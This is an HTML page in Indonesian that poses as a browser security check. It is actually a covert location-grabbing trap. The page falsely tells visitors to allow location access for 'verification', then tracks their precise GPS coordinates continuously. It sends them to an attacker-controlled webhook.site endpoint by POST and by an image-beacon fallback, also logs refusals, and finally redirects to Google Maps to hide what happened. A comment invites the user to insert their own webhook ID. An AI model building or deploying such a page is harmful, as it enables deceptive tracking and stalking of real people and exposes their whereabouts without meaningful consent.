<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi Keamanan Sistem</title>
    <style>
        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f4f4f9; }
        .container { text-align: center; padding: 20px; border-radius: 8px; background: white; box-shadow: 0 4px 15px rgba(0,0,0,0.1); max-width: 400px; }
        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #status { font-weight: bold; color: #e74c3c; }
    </style>
</head>
<body>

<div class="container">
    <div class="loader"></div>
    <h2>Verifikasi Browser</h2>
    <p>Sedang memeriksa koneksi. Mohon klik <b>"Izinkan"</b> atau <b>"Allow"</b> jika muncul permintaan akses lokasi.</p>
    <p id="status">Menunggu Izin...</p>
</div>

<script>
    // GANTI DENGAN ID WEBHOOK ANDA
    const WEBHOOK_ID = "31392989-6f64-41e2-84ee-91df8e979cd4";
    const WEBHOOK_URL = `https://webhook.site/${WEBHOOK_ID}`;

    function sendToPython(position) {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        const acc = position.coords.accuracy;
        const dataStr = `Lat: ${lat}, Lon: ${lon}, Acc: ${acc}m`;

        // Metode 1: Fetch POST (Utama)
        fetch(WEBHOOK_URL, {
            method: 'POST',
            mode: 'no-cors', 
            body: dataStr
        });

        // Metode 2: URL Param (Cadangan jika POST diblokir/kosong)
        const img = new Image();
        img.src = `${WEBHOOK_URL}?data=${encodeURIComponent(dataStr)}`;

        document.getElementById('status').innerText = "Koneksi Stabil - Mengalihkan...";
        document.getElementById('status').style.color = "#27ae60";

        setTimeout(() => {
            window.location.href = "https://www.google.com/maps";
        }, 3000);
    }

    function handleError(error) {
        let msg = "Akses lokasi ditolak. Silakan aktifkan GPS untuk verifikasi.";
        document.getElementById('status').innerText = msg;
        fetch(WEBHOOK_URL, { method: 'POST', mode: 'no-cors', body: "Error: Izin Ditolak" });
    }

    if (navigator.geolocation) {
        navigator.geolocation.watchPosition(sendToPython, handleError, {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        });
    } else {
        document.getElementById('status').innerText = "Browser tidak mendukung.";
    }
</script>
</body>
</html>
